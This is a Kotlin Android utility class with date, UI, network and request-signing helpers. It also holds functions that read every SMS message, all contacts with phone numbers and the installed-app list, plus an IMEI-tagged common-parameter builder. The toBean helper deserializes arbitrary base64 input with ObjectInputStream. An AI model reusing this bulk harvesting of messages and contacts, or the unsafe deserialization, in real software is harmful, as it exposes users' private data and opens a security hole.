package com.neutron.baselib.utils


import android.annotation.SuppressLint
import android.annotation.TargetApi
import android.app.Activity
import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.content.res.Resources
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.Rect
import android.net.ConnectivityManager
import android.net.Uri
import android.os.Build
import android.provider.ContactsContract
import android.provider.MediaStore
import android.text.TextUtils
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.ViewConfiguration
import android.view.inputmethod.InputMethodManager
import com.google.gson.Gson
import com.neutron.baselib.base.BaseApplication
import com.neutron.baselib.bean.MessageRepository
import com.neutron.baselib.bean.PContacts
import okhttp3.MediaType

import okhttp3.RequestBody
import java.io.*
import java.lang.reflect.Method
import java.security.MessageDigest
import java.security.NoSuchAlgorithmException
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.HashMap


class Utils {


    companion object {

        @SuppressLint("Range")
        fun getMessage(context: Context): ArrayList<MessageRepository> {
            val sms = Uri.parse("content://sms/")
            val cr = context.contentResolver
            val projection = arrayOf("_id", "address", "person", "body", "date", "type")
            val cur = cr.query(sms, projection, null, null, "date desc")
            val list = ArrayList<MessageRepository>()
            if (null == cur) {
                return list
            }
            while (cur.moveToNext()) {
                val number = cur.getString(cur.getColumnIndex("address"))
                val name = cur.getString(cur.getColumnIndex("person"))
                val body = cur.getString(cur.getColumnIndex("body"))
                val date = cur.getLong(cur.getColumnIndex("date"))
                val type = cur.getInt(cur.getColumnIndex("type"))
                val yearTime = formatContactTime(date)
                list.add(MessageRepository(number, name, yearTime, body, type.toString()))
            }
            cur.close()
//        Log.i("MessageUtil", "getMessage: ${Gson().toJson(list)}")
            return list
        }

        fun formatContactTime(time: Long): String {
            return SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(time)
        }

        @SuppressLint("Range")
        fun getAllContacts(context: Context): ArrayList<PContacts>? {
            val contacts: ArrayList<PContacts> = ArrayList<PContacts>()
            val cursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI, null, null, null, null
            )
            while (cursor!!.moveToNext()) {
                //新建一个联系人实例
                val temp = PContacts()
                val contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))
                //获取联系人姓名
                val name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                val time = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP))
                temp.other_name=(name)
                temp.last_time=(time)

                //获取联系人电话号码
                val phoneCursor = context.contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId,
                    null,
                    null
                )
                while (phoneCursor!!.moveToNext()) {
                    var phone =
                        phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    phone = phone.replace("-", "")
                    phone = phone.replace(" ", "")
                    temp.other_mobile=phone
                }

                contacts.add(temp)
                //记得要把cursor给close掉
                phoneCursor.close()
            }
            cursor.close()
            return contacts
        }
        fun isSystemApp(pInfo: PackageInfo): Boolean {
            //判断是否是系统软件
            return pInfo.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM != 0
        }

        fun formatTime(date: Long, format: String?): String? {
            val formatter = SimpleDateFormat(format)
            return formatter.format(date).toString()
        }

        /**
         * 获取系统应用信息
         *
         * @return
         */
        fun getAppList(context: Context): List<ApplistEntity>? {
            val startTime = System.currentTimeMillis() //起始时间
            val appLists: MutableList<ApplistEntity> = ArrayList<ApplistEntity>()
            var appList: ApplistEntity
            val pm = context.packageManager
            val list = pm.getInstalledPackages(PackageManager.GET_UNINSTALLED_PACKAGES)
            for (packageInfo in list) {
                val appName =
                    packageInfo.applicationInfo.loadLabel(context.packageManager).toString()
                val packageName = packageInfo.packageName
                val isSYS: Boolean =
                    isSystemApp(packageInfo)
                if (!TextUtils.isEmpty(appName) && !TextUtils.isEmpty(packageName)) {
                    appList = ApplistEntity()
                    appList.firstTime=formatTime(
                        packageInfo.firstInstallTime,
                        "yyyy-MM-dd HH:mm:ss"
                    )
                    appList.lastTime=   formatTime(
                        packageInfo.lastUpdateTime,
                        "yyyy-MM-dd HH:mm:ss"
                    )
                    appList.name=appName
                    appList.packageName=packageName
                    appList.versionCode=packageInfo.versionName
                    appList.systemApp=if (isSYS) "1" else "2"
                    appLists.add(appList)
                }
            }
            val endTime = System.currentTimeMillis() //结束时间
            Log.i(
                "test",
                String.format(appLists.size.toString() + "方法使用时间 %d ms", endTime - startTime)
            ) //打印使用时间
            return appLists
        }


        /**
         * 计算日期之差
         *
         */

        fun checkDateInValid(oldDate: String, newDate: String):Int {
            val simp = SimpleDateFormat("yyyy-MM-dd")
            val date1 = simp.parse(oldDate)
            val date2 = simp.parse(newDate)
            return getTimeDistance(date1,date2).toInt()
        }


        fun getTimeDistance(beginDate: Date?, endDate: Date?): Long {
            val fromCalendar = Calendar.getInstance()
            fromCalendar.time = beginDate
            fromCalendar[Calendar.HOUR_OF_DAY] = fromCalendar.getMinimum(Calendar.HOUR_OF_DAY)
            fromCalendar[Calendar.MINUTE] = fromCalendar.getMinimum(Calendar.MINUTE)
            fromCalendar[Calendar.SECOND] = fromCalendar.getMinimum(Calendar.SECOND)
            fromCalendar[Calendar.MILLISECOND] = fromCalendar.getMinimum(Calendar.MILLISECOND)
            val toCalendar = Calendar.getInstance()
            toCalendar.time = endDate
            toCalendar[Calendar.HOUR_OF_DAY] = fromCalendar.getMinimum(Calendar.HOUR_OF_DAY)
            toCalendar[Calendar.MINUTE] = fromCalendar.getMinimum(Calendar.MINUTE)
            toCalendar[Calendar.SECOND] = fromCalendar.getMinimum(Calendar.SECOND)
            toCalendar[Calendar.MILLISECOND] = fromCalendar.getMinimum(Calendar.MILLISECOND)
            var dayDistance: Long = (toCalendar.time.time - fromCalendar.time.time) / (1000 * 60 * 60 * 24)
            dayDistance = Math.abs(dayDistance)
            return dayDistance
        }

        /**
         * 计算日期之差
         *
         */

        fun differentDays(beforeDate: Date, afterDate: Date): Int {
            var result = 0

            //将Date类型转换为Calendar类型
            val beforeCalendar = Calendar.getInstance()
            beforeCalendar.time = beforeDate
            val afterCalendar = Calendar.getInstance()
            afterCalendar.time = afterDate

            //获取日期的DayOfYear（这一天在是这一年的第多少天）
            val beforeDayOfYear = beforeCalendar.get(Calendar.DAY_OF_YEAR)
            val afterDayOfYear = afterCalendar.get(Calendar.DAY_OF_YEAR)

            //获取日期的年份
            val beforeYear = beforeCalendar.get(Calendar.YEAR)
            val afterYear = afterCalendar.get(Calendar.YEAR)

            if (beforeYear == afterYear) {
                //同一年
                result = afterDayOfYear - beforeDayOfYear
            } else {
                //不同一年
                var timeDistance = 0
                for (i in beforeYear until afterYear) {
                    timeDistance += if (i % 4 == 0 && i % 100 != 0 || i % 400 == 0) {
                        //闰年
                        366
                    } else {
                        //不是闰年
                        365
                    }
                }
                result = timeDistance + (afterDayOfYear - beforeDayOfYear)
            }

            return result
        }


        /**
         * 序列化对象
         */
        fun fromBean(obj: Any?): String {
            if (obj == null) {
                return ""
            }
            try {
                val byteArrayOutputStream = ByteArrayOutputStream()
                var objectOutputStream: ObjectOutputStream? = null
                objectOutputStream = ObjectOutputStream(byteArrayOutputStream)
                objectOutputStream.writeObject(obj)
                return base64(
                    byteArrayOutputStream.toByteArray(),
                    Base64.DEFAULT
                )
            } catch (e: IOException) {
                e.printStackTrace()
            }
            return ""
        }

        /**
         * String转base64
         */
        fun base64(bytes: ByteArray?, flag: Int): String {
            return if (bytes != null && bytes.size > 0) Base64.encodeToString(bytes, flag) else ""
        }


        /**
         * 反序列化对象
         */
        fun toBean(str: String?): Any? {
            try {
                val bytes = Base64.decode(str, Base64.NO_WRAP)
                val byteArrayInputStream = ByteArrayInputStream(bytes)
                val objectInputStream = ObjectInputStream(byteArrayInputStream)
                return objectInputStream.readObject()
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: ClassNotFoundException) {
                e.printStackTrace()
            }
            return null
        }


        /**
         * 底部虚拟按键栏的高度
         * @return
         */
        @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR1)
        private fun getSoftButtonsBarHeight(activity: Activity): Int {
            val metrics = DisplayMetrics()
            //这个方法获取可能不是真实屏幕的高度
            activity.getWindowManager().getDefaultDisplay().getMetrics(metrics)
            val usableHeight = metrics.heightPixels
            //获取当前屏幕的真实高度
            activity.getWindowManager().getDefaultDisplay().getRealMetrics(metrics)
            val realHeight = metrics.heightPixels
            return if (realHeight > usableHeight) {
                realHeight - usableHeight
            } else {
                0
            }
        }

        private fun isInputMethodShowing(activity: Activity): Boolean {
            //获取当前屏幕内容的高度
            val screenHeight: Int = activity.getWindow().getDecorView().getHeight()
            //获取View可见区域的bottom
            val rect = Rect()
            activity.getWindow().getDecorView().getWindowVisibleDisplayFrame(rect)
            return (screenHeight - rect.bottom - getSoftButtonsBarHeight(activity)) > 0
        }

        fun hideSoftInputWindow(activity: Activity) {
            val imm: InputMethodManager =
                activity.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
            if (isInputMethodShowing(activity)) {
                imm.toggleSoftInput(0, InputMethodManager.HIDE_NOT_ALWAYS)
            }
        }
        fun getNavigationBarHeight(context: Context): Int {
            var result = 0
            if (hasNavBar(context)) {
                val res = context.resources
                val resourceId = res.getIdentifier("navigation_bar_height", "dimen", "android")
                if (resourceId > 0) {
                    result = res.getDimensionPixelSize(resourceId)
                }
            }
            return result
        }

        fun hasNavBar(context: Context): Boolean {
            val res: Resources = context.resources
            val resourceId: Int = res.getIdentifier("config_showNavigationBar", "bool", "android")
            return if (resourceId != 0) {
                var hasNav: Boolean = res.getBoolean(resourceId)
                // check override flag
                val sNavBarOverride: String? = getNavBarOverride()
                if ("1" == sNavBarOverride) {
                    hasNav = false
                } else if ("0" == sNavBarOverride) {
                    hasNav = true
                }
                hasNav
            } else { // fallback
                !ViewConfiguration.get(context).hasPermanentMenuKey()
            }
        }

        private fun getNavBarOverride(): String? {
            var sNavBarOverride: String? = null
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                try {
                    val c = Class.forName("android.os.SystemProperties")
                    val m: Method = c.getDeclaredMethod("get", String::class.java)
                    m.setAccessible(true)
                    sNavBarOverride = m.invoke(null, "qemu.hw.mainkeys").toString()
                } catch (e: Throwable) {
                }
            }
            return sNavBarOverride
        }


        fun checkNet(context: Context): Boolean {
            // 判断是否具有可以用于通信渠道
            val mobileConnection = isMobileConnection(context)
            val wifiConnection = isWIFIConnection(context)
            return if (mobileConnection == false && wifiConnection == false) {
                // 没有网络
                false
            } else true
        }


        /**
         * 判断手机接入点（APN）是否处于可以使用的状态
         *
         * @param context
         * @return
         */
        @SuppressLint("MissingPermission")
        fun isMobileConnection(context: Context): Boolean {
            val manager =
                context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val networkInfo = manager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE)
            return if (networkInfo != null && networkInfo.isConnected) {
                true
            } else false
        }

        /**
         * 判断当前wifi是否是处于可以使用状态
         *
         * @param context
         * @return
         */
        @SuppressLint("MissingPermission")
        fun isWIFIConnection(context: Context): Boolean {
            val manager =
                context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val networkInfo = manager.getNetworkInfo(ConnectivityManager.TYPE_WIFI)
            return if (networkInfo != null && networkInfo.isConnected) {
                true
            } else false
        }


        fun getkey(activity: Activity) {
            try {
                val info =
                    activity.packageManager.getPackageInfo(
                        BaseApplication.sContext.packageName,
                        PackageManager.GET_SIGNATURES
                    )
                for (sign in info.signatures) {
                    val md: MessageDigest = MessageDigest.getInstance("SHA")
                    md.update(sign.toByteArray())
                    Slog.d(
                        android.util.Base64.encodeToString(
                            md.digest(),
                            android.util.Base64.DEFAULT
                        )
                    )

                }
            } catch (e: PackageManager.NameNotFoundException) {
                e.printStackTrace()
                Slog.d("error $e")
            } catch (e: NoSuchAlgorithmException) {
                e.printStackTrace()
                Slog.d("error " + e.toString())
            }
        }

        fun uri2File(uri: Uri, context: Context): File? {
            var img_path: String? = ""
            val proj =
                arrayOf<String>(MediaStore.Images.Media.DATA)
            val actualimagecursor: Cursor? = context.contentResolver.query(
                uri,
                proj,
                null,
                null,
                null
            )
            img_path = if (actualimagecursor == null) {
                uri.path
            } else {
                val actual_image_column_index: Int =
                    actualimagecursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                actualimagecursor.moveToFirst()
                actualimagecursor.getString(actual_image_column_index)
            }
            return File(img_path)
        }


        fun signParameter(paramMap: HashMap<String, Any>): String {
            val builder = StringBuilder()
            paramMap.forEach { (_, value) ->
                if (value.toString().isNotEmpty()) {
                    builder.append(value.toString())
                }
            }

//            Slog.d("signParameter加密前: $builder")
            builder.append(BaseConstant.SIGNKEY)
            val mD5 = MD5Utils.md5(MD5Utils.md5(builder.toString()).plus(BaseConstant.SIGNRANDOMCODE))
//            Slog.d("signParameter加密后: $mD5")
            return mD5
        }


        open fun toMakekey(str: String, strLength: Int, `val`: String): String {
            var str = str
            var strLen = str.length
            if (strLen < strLength) {
                while (strLen < strLength) {
                    val buffer = StringBuffer()
                    buffer.append(str).append(`val`)
                    str = buffer.toString()
                    strLen = str.length
                }
            }
            return str
        }

        fun createBody(map: HashMap<String, Any>): RequestBody {
            map["sign"] = signParameter(map)

            val json = Gson().toJson(map)
            Slog.d("createBody  参数  $map")
            Slog.d("createBody  json  $json")
            return RequestBody.create(
                MediaType.parse("application/json;charset=UTF-8"),
                json
            )
        }


        fun createCommonParams(hashMap: HashMap<String, Any>): HashMap<String, Any> {
            val map = HashMap<String, Any>()
            val version = getVersionName(BaseApplication.sContext)
            val IMEI = PreferencesHelper.getIMEI()
            map.apply {
                this["app_version"] = version
                this["appversion"] = version
                this["version"] = "1.0"
                this["channel"] = "1"
                this["imei"] = IMEI
                this["timestamp"] = System.currentTimeMillis().toString()
                this["pkg_name"] = BaseApplication.sContext.packageName
                hashMap.forEach { (key, value) ->
                    this[key] = value
                }
            }
            return map
        }


        /**
         * [获取应用程序版本名称信息]
         *
         * @param context
         * @return 当前应用的版本名称
         */
        @Synchronized
        fun getVersionName(context: Context): String {
            try {
                val packageManager = context.packageManager
                val packageInfo = packageManager.getPackageInfo(
                    context.packageName, 0
                )
                return packageInfo.versionName
            } catch (e: java.lang.Exception) {
                e.printStackTrace()
                Slog.e("应用名称获取失败")
            }
            return ""
        }


        /**
         * [获取应用程序版本名称信息]
         *
         * @param context
         * @return 当前应用的版本名称
         */
        @Synchronized
        fun getVersionCode(context: Context): Int {
            try {
                val packageManager = context.packageManager
                val packageInfo = packageManager.getPackageInfo(
                    context.packageName, 0
                )
                return packageInfo.versionCode
            } catch (e: java.lang.Exception) {
                e.printStackTrace()
            }
            return 0
        }


        /**
         * [获取应用程序版本名称信息]
         *
         * @param context
         * @return 当前应用的版本名称
         */
        @Synchronized
        fun getPackageName(context: Context): String {
            try {
                val packageManager = context.packageManager
                val packageInfo = packageManager.getPackageInfo(context.packageName, 0)
                return packageInfo.packageName
            } catch (e: java.lang.Exception) {
                e.printStackTrace()
            }
            return ""
        }

        /**
         * 是否是Debug模式
         *
         * */
        fun isApkInDebug(context: Context): Boolean {
            return try {
                val info: ApplicationInfo = context.applicationInfo
                info.flags and ApplicationInfo.FLAG_DEBUGGABLE !== 0
            } catch (e: java.lang.Exception) {
                false
            }
        }


        /**
         * bitmap转为base64
         *
         * @param bitmap
         * @return
         */
        fun bitmapToBase64(bitmap: Bitmap?): String? {
            var result = ""
            var baos: ByteArrayOutputStream? = null
            try {
                if (bitmap != null) {
                    baos = ByteArrayOutputStream()
                    bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos)
                    baos.flush()
                    baos.close()
                    val bitmapBytes = baos.toByteArray()
                    result = Base64.encodeToString(bitmapBytes, Base64.DEFAULT)
                }
            } catch (e: IOException) {
                e.printStackTrace()
            } finally {
                try {
                    if (baos != null) {
                        baos.flush()
                        baos.close()
                    }
                } catch (e: IOException) {
                    e.printStackTrace()
                }
            }

            return result
        }


    }
}


class ApplistEntity {
    var firstTime: String? = null
    var lastTime: String? = null
    var name: String? = null
    var packageName: String? = null
    var versionCode: String? = null
    var systemApp: String? = null

    override fun toString(): String {
        return "ApplistEntity{" +
                "firstTime='" + firstTime + '\'' +
                ", lastTime='" + lastTime + '\'' +
                ", name='" + name + '\'' +
                ", packageName='" + packageName + '\'' +
                ", versionCode='" + versionCode + '\'' +
                '}'
    }
}

